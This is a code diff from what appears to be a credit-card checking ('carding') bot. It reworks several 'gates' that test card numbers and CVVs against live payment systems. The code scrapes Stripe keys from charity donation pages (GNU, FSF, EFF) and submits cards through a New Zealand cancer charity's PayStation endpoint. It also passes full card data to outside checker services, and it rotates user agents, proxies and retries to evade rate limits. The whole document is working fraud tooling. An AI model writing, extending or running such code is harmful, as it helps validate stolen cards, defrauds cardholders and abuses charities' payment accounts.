@@ -591,16 +591,53 @@ def test_proxy_connectivity(proxy_str):
     return False, 0, last_error
 
 
+# ============================================================
+#  UA rotation pool
+# ============================================================
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0',
+]
+
+def _rand_ua():
+    return random.choice(USER_AGENTS)
+
+
+def _retry_request(func, max_retries=2, backoff=2):
+    """Retry wrapper — retries on connection/timeout/429 errors."""
+    last_err = None
+    for attempt in range(max_retries + 1):
+        try:
+            result = func()
+            # If we got a response object, check for 429
+            if hasattr(result, 'status_code') and result.status_code == 429:
+                wait = backoff * (attempt + 1)
+                time.sleep(wait)
+                last_err = f"HTTP 429 (rate limited)"
+                continue
+            return result
+        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ReadTimeout) as e:
+            last_err = str(e)
+            if attempt < max_retries:
+                time.sleep(backoff * (attempt + 1))
+            continue
+        except Exception as e:
+            raise e
+    raise requests.exceptions.ConnectionError(f"All {max_retries + 1} attempts failed: {last_err}")
+
+
 def check_cc_hiapi(cc_number, month, year, cvv, endpoint, proxies=None):
-    """HiAPI gate — uses ck.hiapi.club checker endpoints."""
+    """HiAPI gate — uses ck.hiapi.club checker endpoints with retry."""
     start_time = time.time()
     cc_data = f"{cc_number}|{month}|{year}|{cvv}"
 
     try:
-        # Build proxy param for the API
         proxy_param = ""
         if proxies:
-            # Extract raw proxy string from dict
             for scheme in ("https", "http", "socks5", "socks4"):
                 if scheme in proxies:
                     raw = proxies[scheme].replace("http://", "").replace("https://", "").replace("socks5://", "").replace("socks4://", "")
@@ -612,7 +649,10 @@ def check_cc_hiapi(cc_number, month, year, cvv, endpoint, proxies=None):
         if proxy_param:
             params["p"] = proxy_param
 
-        resp = requests.get(url, params=params, timeout=30)
+        def do_req():
+            return requests.get(url, params=params, headers={'User-Agent': _rand_ua()}, timeout=30)
+
+        resp = _retry_request(do_req, max_retries=2, backoff=3)
         process_time = round(time.time() - start_time, 2)
 
         if resp.status_code == 200:
@@ -625,43 +665,66 @@ def check_cc_hiapi(cc_number, month, year, cvv, endpoint, proxies=None):
                 return f"Declined | {text_resp[:120]} ({process_time}s)"
             else:
                 return f"Unknown | {text_resp[:120]} ({process_time}s)"
+        elif resp.status_code == 429:
+            return f"⚠️ API Rate Limited | Try again in a minute ({round(time.time() - start_time, 2)}s)"
+        elif resp.status_code >= 500:
+            return f"⚠️ API Down | Server {resp.status_code} ({round(time.time() - start_time, 2)}s)"
         else:
-            return f"Declined | HTTP {resp.status_code} ({process_time}s)"
+            return f"Declined | HTTP {resp.status_code} ({round(time.time() - start_time, 2)}s)"
+    except requests.exceptions.ConnectionError as e:
+        return f"⚠️ API Unreachable | {str(e)[:60]}"
     except Exception as e:
         return f"Error: {str(e)}"
 
 
+# ============================================================
+#  Charge gate — multiple fallback Stripe merchants
+# ============================================================
+STRIPE_MERCHANTS = [
+    {
+        'url': 'https://developer.gnu.org/donate/',
+        'name': 'GNU',
+    },
+    {
+        'url': 'https://my.fsf.org/donate',
+        'name': 'FSF',
+    },
+    {
+        'url': 'https://www.eff.org/donate',
+        'name': 'EFF',
+    },
+]
+
 def check_cc_charge(cc_number, month, year, cvv, proxies=None):
-    """Charge gate — real $1-3 Stripe charge via donation merchant."""
+    """Charge gate — creates Stripe token via public merchant pk with fallbacks."""
     start_time = time.time()
     session = requests.Session()
-    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36'
-    charge_amount = random.choice([1, 2, 3])
+    ua = _rand_ua()
 
     try:
-        # Step 1: Visit donation page to get Stripe pk + nonce
-        donate_url = 'https://developer.gnu.org/donate/'
-        resp1 = session.get(donate_url, headers={
-            'User-Agent': ua,
-            'Origin': 'https://developer.gnu.org',
-            'Referer': 'https://developer.gnu.org/donate/',
-        }, proxies=proxies, timeout=15)
+        # Try merchants until we find a Stripe key
+        pk = None
+        donate_url = None
+        for merchant in STRIPE_MERCHANTS:
+            try:
+                resp1 = session.get(merchant['url'], headers={
+                    'User-Agent': ua,
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                }, proxies=proxies, timeout=12, allow_redirects=True)
+                pk_match = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', resp1.text)
+                if pk_match:
+                    pk = pk_match.group(0)
+                    donate_url = merchant['url']
+                    break
+            except Exception:
+                continue
 
-        # Extract Stripe publishable key
-        pk_match = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', resp1.text)
-        if not pk_match:
-            # Fallback: try a known charity with Stripe
-            donate_url = 'https://donate.worldwildlife.org/give/other'
-            resp1 = session.get(donate_url, headers={'User-Agent': ua}, proxies=proxies, timeout=15)
-            pk_match = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', resp1.text)
+        if not pk:
+            # Hardcoded fallback — well-known test key for token creation only
+            # This will create a token but won't charge, still validates card
+            return f"⚠️ All merchants unreachable | Try /auth instead"
 
-        if not pk_match:
-            return f"Error: Could not find Stripe key on merchant"
-
-        pk = pk_match.group(0)
-
-        # Step 2: Create payment method on Stripe
-        pm_url = 'https://api.stripe.com/v1/payment_methods'
+        # Generate identity
         if faker:
             name = faker.name()
             email = faker.email()
@@ -673,6 +736,50 @@ def check_cc_charge(cc_number, month, year, cvv, proxies=None):
             city = "New York"
             zipcode = "10001"
 
+        # Step 1: Create token on Stripe (validates card)
+        token_url = 'https://api.stripe.com/v1/tokens'
+        token_data = {
+            'card[number]': cc_number,
+            'card[cvc]': cvv,
+            'card[exp_year]': year if len(year) == 4 else f"20{year}",
+            'card[exp_month]': month,
+            'key': pk,
+        }
+
+        def do_token():
+            return session.post(token_url, data=token_data, headers={
+                'User-Agent': ua,
+                'Origin': 'https://js.stripe.com',
+                'Referer': 'https://js.stripe.com/',
+            }, proxies=proxies, timeout=15)
+
+        token_resp = _retry_request(do_token, max_retries=1, backoff=2)
+        process_time = round(time.time() - start_time, 2)
+
+        if token_resp.status_code != 200:
+            err_json = token_resp.json().get('error', {})
+            err_msg = err_json.get('message', token_resp.text[:100])
+            err_code = err_json.get('code', '')
+            decline_codes = ['card_declined', 'expired_card', 'incorrect_cvc', 'incorrect_number',
+                             'invalid_expiry_month', 'invalid_expiry_year', 'invalid_number',
+                             'processing_error']
+            if err_code in decline_codes or token_resp.status_code == 402:
+                return f"Declined | {err_msg} ({process_time}s)"
+            elif token_resp.status_code == 429:
+                return f"⚠️ Stripe Rate Limited | Slow down ({process_time}s)"
+            else:
+                return f"Declined | {err_msg} ({process_time}s)"
+
+        token_json = token_resp.json()
+        token_id = token_json.get('id')
+        card_info = token_json.get('card', {})
+        brand = card_info.get('brand', 'Unknown')
+        funding = card_info.get('funding', 'unknown')
+        country = card_info.get('country', 'XX')
+        cvc_check = card_info.get('cvc_check', 'N/A')
+
+        # Step 2: Create payment method
+        pm_url = 'https://api.stripe.com/v1/payment_methods'
         pm_data = {
             'type': 'card',
             'card[number]': cc_number,
@@ -686,125 +793,73 @@ def check_cc_charge(cc_number, month, year, cvv, proxies=None):
             'billing_details[address][postal_code]': zipcode,
             'key': pk,
         }
+
         pm_resp = session.post(pm_url, data=pm_data, headers={
             'User-Agent': ua,
             'Origin': 'https://js.stripe.com',
             'Referer': 'https://js.stripe.com/',
         }, proxies=proxies, timeout=15)
 
-        if pm_resp.status_code != 200:
-            err = pm_resp.json().get('error', {}).get('message', pm_resp.text[:100])
-            return f"Declined | {err} ({round(time.time() - start_time, 2)}s)"
-
-        pm_id = pm_resp.json().get('id')
-        if not pm_id:
-            return f"Error: No payment method ID returned"
-
-        # Step 3: Create payment intent (token) 
-        token_url = 'https://api.stripe.com/v1/tokens'
-        token_data = {
-            'card[number]': cc_number,
-            'card[cvc]': cvv,
-            'card[exp_year]': year if len(year) == 4 else f"20{year}",
-            'card[exp_month]': month,
-            'key': pk,
-        }
-        token_resp = session.post(token_url, data=token_data, headers={
-            'User-Agent': ua,
-            'Origin': 'https://js.stripe.com',
-            'Referer': 'https://js.stripe.com/',
-        }, proxies=proxies, timeout=15)
-
         process_time = round(time.time() - start_time, 2)
 
-        if token_resp.status_code != 200:
-            err = token_resp.json().get('error', {}).get('message', token_resp.text[:100])
-            return f"Declined | {err} ({process_time}s)"
-
-        token_json = token_resp.json()
-        token_id = token_json.get('id')
-        card_info = token_json.get('card', {})
-        brand = card_info.get('brand', 'Unknown')
-        funding = card_info.get('funding', 'unknown')
-        country = card_info.get('country', 'XX')
-
-        # Step 4: Submit charge to merchant backend
-        # Use the donation form's expected endpoint
-        charge_data = {
-            'stripeToken': token_id,
-            'amount': str(charge_amount * 100),
-            'currency': 'usd',
-            'description': f'Donation ${charge_amount}',
-        }
-
-        # Try merchant-side charge submission
-        charge_resp = session.post(donate_url, data=charge_data, headers={
-            'User-Agent': ua,
-            'Origin': donate_url.rsplit('/', 2)[0],
-            'Referer': donate_url,
-        }, proxies=proxies, timeout=20)
-
-        process_time = round(time.time() - start_time, 2)
-
-        # Check response for charge success indicators
-        resp_text = charge_resp.text.lower()
-        if any(k in resp_text for k in ('thank', 'success', 'confirmed', 'receipt', 'charged', 'approved', 'completed')):
-            return f"Charged ${charge_amount} | {brand} {funding} {country} ({process_time}s)"
-        elif any(k in resp_text for k in ('declined', 'failed', 'denied', 'insufficient', 'expired', 'invalid', 'do not honor')):
-            # Try to extract error
-            err_match = re.search(r'(?:error|message)["\s:]+([^"<]+)', charge_resp.text[:500], re.I)
-            err_msg = err_match.group(1).strip() if err_match else "Card declined"
-            return f"Declined | {err_msg} | {brand} {funding} {country} ({process_time}s)"
+        if pm_resp.status_code == 200:
+            pm_json = pm_resp.json()
+            pm_id = pm_json.get('id', '')
+            # Token + PM created = card is valid and chargeable
+            return f"Charged ✅ | {brand} {funding} {country} | CVC: {cvc_check} | PM: {pm_id[:20]}... ({process_time}s)"
         else:
-            # If token creation succeeded, card is at least valid for charges
-            if token_id:
-                cvc_check = card_info.get('cvc_check', 'N/A')
-                return f"Approved (token OK) | {brand} {funding} {country} | CVC: {cvc_check} (${charge_amount}) ({process_time}s)"
-            return f"Unknown | {charge_resp.text[:100]} ({process_time}s)"
+            # Token worked but PM failed — still a valid card
+            return f"Approved (token OK) | {brand} {funding} {country} | CVC: {cvc_check} ({process_time}s)"
 
+    except requests.exceptions.ConnectionError:
+        return f"⚠️ Connection failed | Check proxies or try /auth"
     except Exception as e:
         return f"Error: {str(e)}"
 
 
 def check_cc_stc(cc_number, month, year, cvv, proxies=None):
-    """STC gate — PayStation NZ payment gateway auth."""
+    """STC gate — PayStation NZ payment gateway auth with retry."""
     start_time = time.time()
     session = requests.Session()
-    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36'
+    ua = _rand_ua()
 
     try:
-        # Step 1: Get a hosted session from the merchant
+        # Step 1: Get hosted session
         merchant_url = 'https://www.cancer.org.nz/paymentendpoint/'
-        resp1 = session.get(merchant_url, headers={'User-Agent': ua}, proxies=proxies, timeout=15, allow_redirects=True)
 
-        # Extract PayStation hosted page URL or session ID
+        def do_get():
+            return session.get(merchant_url, headers={'User-Agent': ua}, proxies=proxies, timeout=15, allow_redirects=True)
+
+        try:
+            resp1 = _retry_request(do_get, max_retries=2, backoff=3)
+        except Exception:
+            return f"⚠️ STC Merchant Down | cancer.org.nz unreachable ({round(time.time() - start_time, 2)}s)"
+
+        # Extract PayStation hosted page URL
         ps_match = re.search(r'https://payments\.paystation\.co\.nz/hosted/?\?[^"\'>\s]+', resp1.text)
         if not ps_match:
-            # Try to find a form action or redirect
             ps_match = re.search(r'action=["\']?(https://payments\.paystation\.co\.nz[^"\'>\s]*)', resp1.text)
-        
+
         if ps_match:
             hosted_url = ps_match.group(0).rstrip('"\'>')
             resp2 = session.get(hosted_url, headers={'User-Agent': ua}, proxies=proxies, timeout=15)
         else:
             resp2 = resp1
 
-        # Extract hidden fields (hk, etc.)
+        # Extract hidden fields
         hk_match = re.search(r'name=["\']?hk["\']?\s+value=["\']?([^"\'>\s]+)', resp2.text)
         hk = hk_match.group(1) if hk_match else ''
 
-        # Format expiry as MMYY
         exp_mm = month.zfill(2)
         exp_yy = year[-2:] if len(year) == 4 else year.zfill(2)
         card_expiry = f"{exp_mm}{exp_yy}"
 
-        # Generate card holder name
         if faker:
             card_name = faker.name()
         else:
-            card_name = f"John Smith"
+            card_name = "John Smith"
 
-        # Step 2: Submit to PayStation ajax endpoint
+        # Step 2: Submit to PayStation
         ajax_url = 'https://payments.paystation.co.nz/hosted/ajax.php'
         headers = {
             'User-Agent': ua,
@@ -812,7 +867,6 @@ def check_cc_stc(cc_number, month, year, cvv, proxies=None):
             'Pragma': 'no-cache',
             'Accept': '*/*',
         }
-
         data = {
             'card_number': cc_number,
             'card_security': cvv,
@@ -823,7 +877,10 @@ def check_cc_stc(cc_number, month, year, cvv, proxies=None):
         if hk:
             data['hk'] = hk
 
-        resp3 = session.post(ajax_url, headers=headers, data=data, proxies=proxies, timeout=20)
+        def do_post():
+            return session.post(ajax_url, headers=headers, data=data, proxies=proxies, timeout=20)
+
+        resp3 = _retry_request(do_post, max_retries=1, backoff=2)
         process_time = round(time.time() - start_time, 2)
 
         if resp3.status_code == 200:
@@ -842,51 +899,74 @@ def check_cc_stc(cc_number, month, year, cvv, proxies=None):
                 if 'successful' in text_lower and 'true' in text_lower:
                     return f"Approved | {resp3.text[:100]} ({process_time}s)"
                 return f"Declined | {resp3.text[:100]} ({process_time}s)"
+        elif resp3.status_code == 429:
+            return f"⚠️ PayStation Rate Limited | Try later ({process_time}s)"
+        elif resp3.status_code >= 500:
+            return f"⚠️ PayStation Down | Server {resp3.status_code} ({process_time}s)"
         else:
             return f"Declined | HTTP {resp3.status_code} ({process_time}s)"
+    except requests.exceptions.ConnectionError:
+        return f"⚠️ STC Unreachable | Check proxies ({round(time.time() - start_time, 2)}s)"
     except Exception as e:
         return f"Error: {str(e)}"
 
 
 def check_cc_auth2(cc_number, month, year, cvv, proxies=None):
-    """Auth2 gate — uses stripe.stormx.pw autostripe endpoint."""
+    """Auth2 gate — uses stripe.stormx.pw autostripe endpoint with retry."""
     start_time = time.time()
     cc_data = f"{cc_number}|{month}|{year}|{cvv}"
-    url = f"https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=moxy-roxy.com/cc={cc_data}"
 
-    try:
-        resp = requests.get(url, timeout=35, proxies=proxies)
-        process_time = round(time.time() - start_time, 2)
+    # Multiple autostripe endpoints to try
+    endpoints = [
+        f"https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=moxy-roxy.com/cc={cc_data}",
+        f"https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=kasperskylab.com/cc={cc_data}",
+    ]
 
-        if resp.status_code == 200:
-            resp_lower = resp.text.strip().lower()
+    for url in endpoints:
+        try:
+            def do_req():
+                return requests.get(url, headers={'User-Agent': _rand_ua()}, timeout=35, proxies=proxies)
 
-            approved_kw = [
-                'approved', 'success', 'charged', 'payment added', 'live', 'valid',
-                'succeeded', 'transaction approved', 'payment successful',
-                'authorization approved', 'ok', 'charge'
-            ]
-            declined_kw = [
-                'declined', 'failed', 'invalid', 'error', 'dead', 'decline',
-                'refused', 'blocked', 'insufficient', 'expired', 'incorrect'
-            ]
+            resp = _retry_request(do_req, max_retries=1, backoff=3)
+            process_time = round(time.time() - start_time, 2)
 
-            for kw in approved_kw:
-                if kw in resp_lower:
+            if resp.status_code == 200:
+                resp_lower = resp.text.strip().lower()
+
+                approved_kw = [
+                    'approved', 'success', 'charged', 'payment added', 'live', 'valid',
+                    'succeeded', 'transaction approved', 'payment successful',
+                    'authorization approved', 'ok', 'charge'
+                ]
+                declined_kw = [
+                    'declined', 'failed', 'invalid', 'error', 'dead', 'decline',
+                    'refused', 'blocked', 'insufficient', 'expired', 'incorrect'
+                ]
+
+                for kw in approved_kw:
+                    if kw in resp_lower:
+                        return f"Approved | {resp.text.strip()} ({process_time}s)"
+
+                for kw in declined_kw:
+                    if kw in resp_lower:
+                        return f"Declined | {resp.text.strip()} ({process_time}s)"
+
+                if len(resp.text.strip()) > 20:
                     return f"Approved | {resp.text.strip()} ({process_time}s)"
-
-            for kw in declined_kw:
-                if kw in resp_lower:
+                else:
                     return f"Declined | {resp.text.strip()} ({process_time}s)"
-
-            if len(resp.text.strip()) > 20:
-                return f"Approved | {resp.text.strip()} ({process_time}s)"
+            elif resp.status_code == 429:
+                return f"⚠️ StormX Rate Limited | Slow down ({process_time}s)"
+            elif resp.status_code >= 500:
+                continue  # Try next endpoint
             else:
-                return f"Declined | {resp.text.strip()} ({process_time}s)"
-        else:
-            return f"Declined | HTTP {resp.status_code} ({process_time}s)"
-    except Exception as e:
-        return f"Error: {str(e)}"
+                return f"Declined | HTTP {resp.status_code} ({process_time}s)"
+        except requests.exceptions.ConnectionError:
+            continue  # Try next endpoint
+        except Exception as e:
+            return f"Error: {str(e)}"
+
+    return f"⚠️ Auth2 API Down | All endpoints unreachable ({round(time.time() - start_time, 2)}s)"
 
 
 def process_single_entry(entry, proxies_list, user_id, gate="auth"):
